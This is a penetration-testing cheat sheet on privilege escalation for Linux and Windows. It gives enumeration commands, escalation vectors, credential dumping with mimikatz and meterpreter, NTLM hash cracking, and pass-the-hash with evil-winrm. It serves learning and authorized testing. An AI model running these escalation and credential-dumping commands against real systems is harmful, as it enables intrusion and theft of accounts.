# Privilege Escalation

From a low-privilege shell to **root** (Linux) or **SYSTEM/Administrator** (Windows). Work a checklist — privesc is about noticing one misconfiguration, so enumerate thoroughly before trying anything. Automated scripts speed this up, but understand what they flag.

First, always get situational awareness: `id` / `whoami`, the OS/version, and what you can run.

---

## Linux

### Automated enumeration

```bash
./linpeas.sh                         # the go-to all-in-one enumerator
./lse.sh                             # linux-smart-enumeration (quieter, leveled)
```

Transfer it via a Python web server + `wget`/`curl` (see [cheatsheets](../cheatsheets/README.md)).

### Manual checklist (in rough priority order)

```bash
sudo -l                              # commands you can run as root — check GTFOBins for each
find / -perm -4000 -type f 2>/dev/null   # SUID binaries — check GTFOBins
cat /etc/crontab; ls -la /etc/cron.*     # cron jobs running as root (writable script?)
getcap -r / 2>/dev/null              # file capabilities (e.g. cap_setuid on python)
uname -a                             # kernel version → searchsploit for kernel exploit (last resort)
cat /etc/passwd                      # accounts; writable /etc/passwd = instant root
history; cat ~/.bash_history         # leaked creds
ls -la /home/*; find / -name "*.conf" 2>/dev/null   # config files with passwords
env                                  # secrets in environment / writable PATH
```

### Common Linux vectors

- **`sudo -l`** → a command you can run as root. Look it up on **[GTFOBins](https://gtfobins.github.io)** for a privesc one-liner (`sudo <binary>` → shell).
- **SUID binary** → runs as its owner (often root). GTFOBins has the escape for each.
- **Writable cron script** running as root → add your command, wait for it to fire.
- **Capabilities** → e.g. `cap_setuid+ep` on `python`/`perl` gives a root shell directly.
- **Password reuse** → a cred from loot that also works for `su root` or another user.
- **Kernel exploit** → match `uname -a` to a public exploit. Use last — can crash the box.
- **PATH hijacking / LD_PRELOAD** → when a root process calls a binary by relative name.

GTFOBins is the single most useful site here — bookmark it.

---

## Windows

### Automated enumeration

```powershell
winPEAS.exe                          # all-in-one (also winPEASany/.bat)
# or PowerShell equivalents:
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
.\jaws-enum.ps1 -OutputFilename out.txt
```

### Manual checklist

```cmd
whoami /priv                         # token privileges (SeImpersonate = Potato attacks)
whoami /groups
systeminfo                           # OS/patch level → Windows-Exploit-Suggester
net user; net localgroup administrators
```

### Common Windows vectors

- **Token privileges** — `SeImpersonatePrivilege` or `SeAssignPrimaryToken` → **Potato** attacks (JuicyPotato / PrintSpoofer) to get SYSTEM. Very common on service accounts.
- **Unquoted service paths** — a service path with spaces and no quotes lets you plant a binary earlier in the path.
- **Weak service permissions** — a service you can reconfigure (`sc config`) to run your payload, then restart it.
- **AlwaysInstallElevated** — if set in registry, install a malicious MSI as SYSTEM.
- **Stored credentials** — `cmdkey /list`, registry autologon, `unattend.xml` / `sysprep.xml` in `C:\Windows\Panther\`, saved creds in files.
- **Missing patches** — feed `systeminfo` to Windows-Exploit-Suggester for a kernel exploit.
- **UAC bypass** — when you're an admin but in a medium-integrity shell.

### Credential dumping (after SYSTEM)

```
# Metasploit meterpreter
hashdump
load kiwi; creds_all

# Mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::sam
```

Crack NTLM hashes offline:

```bash
hashcat -m 1000 hashes.txt rockyou.txt
john --format=NT hashes.txt
```

Or **pass-the-hash** with the NTLM hash directly (e.g. `evil-winrm -i <ip> -u <user> -H <hash>`).

---

## Privesc discipline

- **Enumerate fully first.** The vector is usually one line in linpeas/winPEAS output.
- **Loot before and after escalating.** New privileges unlock new files, creds, and hashes — which often unlock the *next* host.
- **Cracked/dumped creds feed pivoting.** Reuse them across the network. See [pivoting](../pivoting/README.md).
